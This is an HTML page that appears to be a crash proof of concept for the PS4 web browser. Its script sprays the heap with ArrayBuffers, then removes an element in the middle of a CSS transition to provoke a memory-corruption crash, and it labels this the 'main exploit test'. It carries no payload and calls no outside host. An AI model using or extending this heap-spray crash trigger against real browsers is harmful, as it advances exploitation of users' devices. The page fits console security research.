<!DOCTYPE html>
<html>
<head>
  <title>PS4 Full-Screen Crash Test</title>
  <style>
    #box {
      width: 100px;
      height: 100px;
      background: red;
      transition: all 1s;
    }
    #status {
      font-family: Arial;
      color: white;
      background: black;
      padding: 10px;
    }
  </style>
</head>
<body style="background: #000;">
  <div id="box"></div>
  <div id="status">Waiting for interaction...</div>

  <script>
    const box = document.getElementById('box');
    const status = document.getElementById('status');

    // Heap spray (attempt to control memory layout)
    function heapSpray() {
      const spray = new Array(1000);
      for (let i = 0; i < spray.length; i++) {
        spray[i] = new ArrayBuffer(0x10000); // Allocate memory
      }
      return spray;
    }

    // Main exploit test
    function triggerExploit() {
      status.textContent = "Triggering transition...";
      
      // Force layout calculation
      getComputedStyle(box).transform;

      // Start CSS transition
      box.style.transform = 'translateX(300px)';

      // Remove element mid-transition
      setTimeout(() => {
        status.textContent = "Removing element...";
        box.remove();

        // Force reflow (layout thrashing)
        document.body.offsetHeight;

        // Optional: Reload (may worsen crash)
        // location.href = "?crash=1";

        // Enter full-screen (if possible)
        status.textContent = "Try FULLSCREEN NOW! (Crash on exit)";
      }, 50);
    }

    // Start test after user clicks (avoid auto-triggering)
    status.textContent = "CLICK ANYWHERE TO START TEST";
    document.body.addEventListener('click', () => {
      heapSpray();
      triggerExploit();
    });
  </script>
</body>
</html>
